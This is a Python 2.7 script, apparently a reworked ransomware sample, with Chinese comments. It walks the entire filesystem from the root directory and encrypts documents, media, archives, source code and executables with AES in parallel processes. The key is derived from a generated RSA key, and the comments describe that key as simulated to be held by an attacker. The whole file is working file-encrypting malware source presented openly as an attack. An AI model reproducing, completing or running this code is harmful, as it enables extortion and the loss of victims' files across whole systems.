#!/usr/bin/env python2.7

import os
import random
import struct
from Crypto.Cipher import AES
from Crypto.PublicKey import RSA
from multiprocessing import Pool


# ============== RSA 密钥生成（保留）==============
rsa_key = RSA.generate(2048)
exKey = rsa_key.exportKey('PEM')  # 导出私钥（模拟“发送给攻击者”）

# 从 RSA 私钥中派生一个合法的 256-bit AES 密钥（修复原 bug）
# 使用私钥的模数 n 的哈希作为种子
import hashlib
aes_key = hashlib.sha256(str(rsa_key.n)).digest()  # 32 字节 AES-256 密钥


def encrypt_file(key, in_filename, out_filename=None, chunksize=64*1024):
    """使用 AES-CBC 加密文件，保存原始大小和 IV"""
    if not out_filename:
        out_filename = in_filename + '.crypt'

    iv = ''.join(chr(random.randint(0, 0xFF)) for _ in range(16))
    encryptor = AES.new(key, AES.MODE_CBC, iv)
    filesize = os.path.getsize(in_filename)

    with open(in_filename, 'rb') as infile:
        with open(out_filename, 'wb') as outfile:
            outfile.write(struct.pack('<Q', filesize))
            outfile.write(iv)

            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    chunk += ' ' * (16 - len(chunk) % 16)  # PKCS7 风格填充（用空格）

                outfile.write(encryptor.encrypt(chunk))


def single_arg_encrypt_file(in_filename):
    encrypt_file(aes_key, in_filename)


def select_files():
    """遍历根目录，加密指定扩展名的文件"""
    ext = (".3g2", ".3gp", ".asf", ".asx", ".avi", ".flv",
           ".m2ts", ".mkv", ".mov", ".mp4", ".mpg", ".mpeg",
           ".rm", ".swf", ".vob", ".wmv", ".docx", ".pdf", ".rar",
           ".jpg", ".jpeg", ".png", ".tiff", ".zip", ".7z", ".exe",
           ".tar.gz", ".tar", ".mp3", ".sh", ".c", ".cpp", ".h",
           ".gif", ".txt", ".py", ".pyc", ".jar", ".sql", ".bundle",
           ".sqlite3", ".html", ".php", ".log", ".bak", ".deb")

    files_to_enc = []
    for root, dirs, files in os.walk("/"):
        for file in files:
            if file.endswith(ext):
                files_to_enc.append(os.path.join(root, file))

    # 并行加密（4 进程）
    pool = Pool(processes=4)
    pool.map(single_arg_encrypt_file, files_to_enc)


if __name__ == "__main__":
    select_files()
    # exKey 可用于后续解密（模拟“攻击者持有私钥”）
    # print "[*] RSA 私钥已生成（可用于恢复 AES 密钥）"